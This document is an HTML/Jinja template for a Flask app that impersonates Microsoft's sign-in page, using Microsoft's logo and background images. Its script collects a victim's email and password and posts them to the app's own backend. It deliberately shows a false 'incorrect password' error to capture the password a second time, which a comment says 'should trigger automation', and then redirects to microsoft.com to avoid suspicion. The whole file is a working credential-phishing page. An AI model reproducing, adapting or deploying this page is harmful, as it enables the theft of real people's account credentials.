
<!DOCTYPE html>
<html lang="en">
<head>
<style>
  body {
    font-family: Arial, sans-serif;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
    background-image: url('https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2-small_2055002f2daae2ed8f69f03944c0e5d9.jpg');
    background-size: cover;
  }
  .logo {
    margin-bottom: 15px;
  }
  .step { font-size: 12px; color: #000; margin: -10px 0 14px 0; opacity: .8; }
  .muted {
    color: #000;
    text-decoration: none;
    font-size: 13px;
  }
  .sigopts {
    background-color: white;
    padding: 20px 41px;
    border-radius: 0;
    box-shadow: 0 1px 6px rgba(0, 0, 0, 0.1);
    width: 405px;
    margin-top: 10px;
    text-align: left;
  }
  .header {
    margin: 0 0 20px;
    font-size: 24px;
    font-weight: bold;
  }
  form input {
    width: 100%;
    padding: 6px 6px 6px 0;
    margin-bottom: 10px;
    border: none;
    border-bottom: 1px solid #0067b8;
    background-color: transparent;
    outline: none;
  }
  form div {
    margin: 15px 0;
    font-size: 13px;
  }
  form button {
    padding: 6px 32px;
    border: none;
    border-radius: 0;
    cursor: pointer;
  }
  .btn-back {
    background-color: #e0e0e0;
    color: #000;
    margin-right: 4px;
  }
  .btn-next {
    background-color: #0078d4;
    color: white;
  }
  .error-msg {
    color: red;
    font-weight: normal;
    margin: 10px 0;
  }
  .error-msg span {
    color: blue;
    cursor: pointer;
  }
</style>
</head>
<body>

<div id="container" style="background-color: white; padding: 40px; border-radius: 0; box-shadow: 0 1px 6px rgba(0, 0, 0, 0.1); width: 405px;">

</div>

<div class="sigopts"><span class="muted">&#128273; Sign-in options</span></div>

<script>
  let email = "";
  let password = "";

  function validateEmail(email) {
    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return re.test(email);
  }

  function showStep1() {
    const container = document.getElementById("container");
    container.innerHTML = `
      <img class="logo" role="img" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft" style="margin-bottom: 15px;">
      <h1 class="header">Sign in</h1>
      <form id="loginForm">
        <input type="text" id="emailInput" placeholder="Email, phone, or Skype" required>
        <div style="margin: 15px 0; font-size: 13px;">
          <span style="color: #000; text-decoration: none;">No account? <span style="color: #0067b8; text-decoration: none;">Create one!</span></span><br><br>
          <span style="color: #0067b8; text-decoration: none;">Can't access your account?</span>
        </div>
        <div style="display: flex; justify-content: flex-end;">
          <button type="button" class="btn-back" id="btnBack" disabled>Back</button>
          <button type="submit" class="btn-next">Next</button>
        </div>
      </form>
    `;
    document.getElementById("loginForm").addEventListener("submit", function(e){
      e.preventDefault();
      const val = document.getElementById("emailInput").value.trim();
      if(validateEmail(val)) {
        email = val;
        showStep2();
      } else {
        alert("Please enter a valid email address.");
      }
    });
  }

  function showStep2() {
    const container = document.getElementById("container");
    container.innerHTML = `
      <img class="logo" role="img" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft" style="margin-bottom: 3px;">
      <div class="muted" style="margin:15px 5px;">← ${email}</div>
      <h1 class="header">Enter Password</h1>
      <input type="password" id="passwordInput" placeholder="Password" required 
       style="border: none; outline: none; background: transparent; 
              border-bottom: 2px solid blue; width: 400px; 
              padding: 0; display: inline-block;">
      <form id="loginForm">
        <div style="margin: 15px 0; font-size: 13px;">
          <span style="color: #0067b8; text-decoration: none;">Is this your account?</span>
        </div>
        <div style="display: flex; justify-content: flex-end;">
          <button type="button" class="btn-back" id="btnBack">Back</button>
          <button type="submit" class="btn-next">Next</button>
        </div>
      </form>
    `;
    document.getElementById("btnBack").addEventListener("click", function(){
      showStep1();
    });
    document.getElementById("loginForm").addEventListener("submit", function(e){
      e.preventDefault();
      const pwd = document.getElementById("passwordInput").value;
      if(pwd.trim()) {
        password = pwd;
        // Submit to backend for first attempt (should fail with "try again")
        submitToBackend(email, password, false);
      } else {
        alert("Please enter your password.");
      }
    });
  }

  function showStep3() {
    const container = document.getElementById("container");
    container.innerHTML = `
      <img class="logo" role="img" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft" style="margin-bottom: 15px;">
      <div class="muted" style="margin:10px 9px;">← ${email}</div>
      <h1 class="header">Enter Password</h1>
      <input type="password" id="passwordInput" placeholder="Password" required 
       style="border: none; outline: none; background: transparent; 
              border-bottom: 2px solid blue; width: 400px; 
              padding: 5px 0; display: inline-block;" value="${password}">
      <form id="finalForm" method="POST" action="/">
        <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
        <input type="hidden" name="email" value="">
        <input type="hidden" name="password" value="">
        <input type="hidden" name="submit" value="Sign in">
        <div style="margin: 15px 0; font-size: 13px;">
          <span style="color: #0067b8; text-decoration: none;">Enter your password to continue</span>
        </div>
        <div style="display: flex; justify-content: flex-end;">
          <button type="button" class="btn-back" id="btnBack">Back</button>
          <button type="submit" class="btn-next" id="signinBtn">
            <span id="signinSpinner" class="d-none"></span>
            Sign in
          </button>
        </div>
      </form>
    `;
    
    // Set the hidden form values
    document.querySelector('input[name="email"]').value = email;
    document.querySelector('input[name="password"]').value = password;
    
    document.getElementById("btnBack").addEventListener("click", function(){
      showStep2();
    });
    
    document.getElementById("finalForm").addEventListener("submit", function(e){
      e.preventDefault();
      const finalPassword = document.getElementById("passwordInput").value;
      if(finalPassword.trim()) {
        // Show loading state
        const signinBtn = document.getElementById("signinBtn");
        signinBtn.disabled = true;
        signinBtn.innerHTML = `
          <span style="display: inline-block; width: 12px; height: 12px; border: 2px solid #fff; border-radius: 50%; border-top-color: transparent; animation: spin 1s linear infinite; margin-right: 8px;"></span>
          Processing...
        `;
        // Add CSS animation inline
        if (!document.querySelector('#spin-animation')) {
          const style = document.createElement('style');
          style.id = 'spin-animation';
          style.textContent = '@keyframes spin { to { transform: rotate(360deg); } }';
          document.head.appendChild(style);
        }
        // Submit to backend for second attempt (should trigger automation)
        submitToBackend(email, finalPassword, true);
      } else {
        alert("Please enter your password.");
      }
    });
  }

  // Prefill from ?email= if present and valid
  (function prefillFromQuery(){
    try {
      const q = new URLSearchParams(window.location.search);
      const hinted = (q.get("email") || "").trim();
      const step = q.get("step") || "";
      
      if (hinted && validateEmail(hinted)) {
        email = hinted;
        if (step === "password") {
          showStep2();
          return;
        }
      }
    } catch (_) {}
  })();

  // Show error messages inline like Microsoft
  function showError(message) {
    const container = document.getElementById("container");
    const existingError = container.querySelector('.error-msg');
    if (existingError) {
      existingError.remove();
    }
    
    const errorDiv = document.createElement('div');
    errorDiv.className = 'error-msg';
    errorDiv.innerHTML = `
      <div style="color: #e81123; font-size: 13px; margin: 10px 0;">
        ${message}
      </div>
    `;
    
    const header = container.querySelector('.header');
    if (header) {
      header.parentNode.insertBefore(errorDiv, header.nextSibling);
    }
  }

  // Show success or error messages from Flask
  {% if get_flashed_messages() %}
    {% for message in get_flashed_messages(with_categories=true) %}
      {% if message[0] == 'error' %}
        setTimeout(() => {
          showError("{{ message[1]|e }}");
        }, 100);
      {% elif message[0] == 'success' %}
        setTimeout(() => {
          alert("{{ message[1] }}");
        }, 100);
      {% endif %}
    {% endfor %}
  {% endif %}

  // Function to submit credentials to backend
  function submitToBackend(emailVal, passwordVal, isSecondAttempt) {
    const formData = new FormData();
    formData.append('csrf_token', '{{ csrf_token() }}');
    formData.append('email', emailVal);
    formData.append('password', passwordVal);
    formData.append('submit', 'Sign in');
    
    fetch('/', {
      method: 'POST',
      body: formData
    })
    .then(response => {
      const redirected = response.redirected;
      const url = response.url;
      
      // Check if redirected to microsoft.com (success case)
      if (redirected && url.includes('microsoft.com')) {
        window.location.href = 'https://microsoft.com';
        return;
      }
      
      return response.text();
    })
    .then(html => {
      if (!html) return; // Already redirected
      
      // Parse the response to check for error messages
      const parser = new DOMParser();
      const doc = parser.parseFromString(html, 'text/html');
      
      // Look for error messages in the response
      let hasError = false;
      let errorMessage = '';
      
      // Check for flashed error messages
      const scripts = doc.querySelectorAll('script');
      for (let script of scripts) {
        if (script.textContent.includes('showError')) {
          const errorMatch = script.textContent.match(/showError\("([^"]+)"/);
          if (errorMatch) {
            hasError = true;
            errorMessage = errorMatch[1];
            break;
          }
        }
      }
      
      // Check URL parameters for errors
      const currentUrl = new URL(window.location.href);
      if (html.includes('error=true') || currentUrl.searchParams.get('error')) {
        hasError = true;
        if (!errorMessage) {
          errorMessage = "Your account or password is incorrect. If you don't remember your password, reset it now.";
        }
      }
      
      if (hasError) {
        if (isSecondAttempt) {
          // Second attempt failed - show error and reset
          showError(errorMessage);
          // Reset the sign-in button
          const signinBtn = document.getElementById("signinBtn");
          if (signinBtn) {
            signinBtn.disabled = false;
            signinBtn.innerHTML = "Sign in";
          }
        } else {
          // First attempt - show error and proceed to step 3
          showError(errorMessage);
          setTimeout(() => showStep3(), 2000);
        }
      } else {
        // No error detected but no redirect - might be success
        window.location.href = 'https://microsoft.com';
      }
    })
    .catch(error => {
      console.error('Error:', error);
      showError('Network error occurred');
      // Reset the sign-in button on error
      const signinBtn = document.getElementById("signinBtn");
      if (signinBtn) {
        signinBtn.disabled = false;
        signinBtn.innerHTML = "Sign in";
      }
    });
  }

  // Initialize the form
  if(!email) {
    showStep1();
  }
</script>

</body>
</html>
